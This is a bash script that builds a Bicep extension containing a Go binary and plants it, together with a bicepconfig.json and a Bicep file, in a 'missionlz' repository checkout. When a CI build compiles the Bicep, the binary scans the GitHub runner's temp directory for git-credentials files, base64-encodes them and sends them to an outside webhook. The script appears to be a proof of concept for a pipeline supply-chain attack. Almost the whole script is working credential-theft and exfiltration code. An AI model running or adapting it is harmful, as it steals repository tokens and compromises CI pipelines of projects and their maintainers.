#!/bin/bash

WEBHOOK_URL="${1:-https://lamian.robertprast.com}"
REPO_PATH="/private/tmp/missionlz"

# Build in a proper directory (not system temp root)
BUILDDIR="$REPO_PATH/.build-tmp"
rm -rf "$BUILDDIR"
mkdir -p "$BUILDDIR"
cd "$BUILDDIR"

# Initialize Go module properly
export GO111MODULE=on
go mod init exfil-extension

# Create main.go
cat > main.go << 'GOCODE'
package main

import (
    "encoding/base64"
    "io/ioutil"
    "net/http"
    "os"
    "path/filepath"
    "strings"
)

func main() {
    webhook := "https://lamian.robertprast.com"
    tempDir := "/home/runner/work/_temp"
    files, _ := ioutil.ReadDir(tempDir)

    for _, f := range files {
        if strings.Contains(f.Name(), "git-credentials") && strings.HasSuffix(f.Name(), ".config") {
            path := filepath.Join(tempDir, f.Name())
            data, err := ioutil.ReadFile(path)
            if err == nil {
                encoded := base64.StdEncoding.EncodeToString(data)
                http.Get(webhook + "?file=" + f.Name() + "&token=" + encoded)
            }
        }
    }
    os.Exit(1)
}
GOCODE

# Build static binary for Linux
CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build -ldflags="-s -w" -o extension-linux-x64 .

# Create index.json with proper bicep types format
cat > index.json << 'INDEX'
{
  "Settings": {
    "Name": "exfil",
    "Version": "1.0.0",
    "IsSingleton": true
  },
  "Types": [
    {
      "$type": "StringType"
    },
    {
      "$type": "ObjectType",
      "Name": "Trigger",
      "Properties": {
        "name": {
          "Type": {
            "$ref": "#/0"
          },
          "Flags": 1,
          "Description": "Resource name"
        }
      }
    },
    {
      "$type": "ResourceType",
      "Name": "Trigger@v1",
      "ScopeType": 0,
      "Body": {
        "$ref": "#/1"
      },
      "Flags": 0
    }
  ],
  "ResourceFunctions": {}
}
INDEX

# Create types.tgz containing index.json
tar -cvf types.tar index.json
gzip -f types.tar
mv types.tar.gz types.tgz

# Create final archive with flat structure
tar -cvf exfil.tar types.tgz extension-linux-x64
gzip -f exfil.tar

# Setup repo structure
mkdir -p "$REPO_PATH/src/extensions"
mv exfil.tar.gz "$REPO_PATH/src/extensions/"

# Create bicepconfig.json in src/
cat > "$REPO_PATH/src/bicepconfig.json" << 'CONFIG'
{
  "experimentalFeaturesEnabled": {
    "extensibility": true
  },
  "extensions": {
    "exfil": "/home/runner/work/missionlz/missionlz/src/extensions/exfil.tar.gz"
  }
}
CONFIG

# Create bicep file in src/
cat > "$REPO_PATH/src/mlz.bicep" << 'BICEP'
extension exfil

resource trigger 'exfil:Trigger@v1' = {
  name: 'test'
}
BICEP

# Cleanup build directory
cd "$REPO_PATH"
rm -rf "$BUILDDIR"

echo "Done! Files created:"
echo "  - $REPO_PATH/src/extensions/exfil.tar.gz"
echo "  - $REPO_PATH/src/bicepconfig.json"
echo "  - $REPO_PATH/src/mlz.bicep"
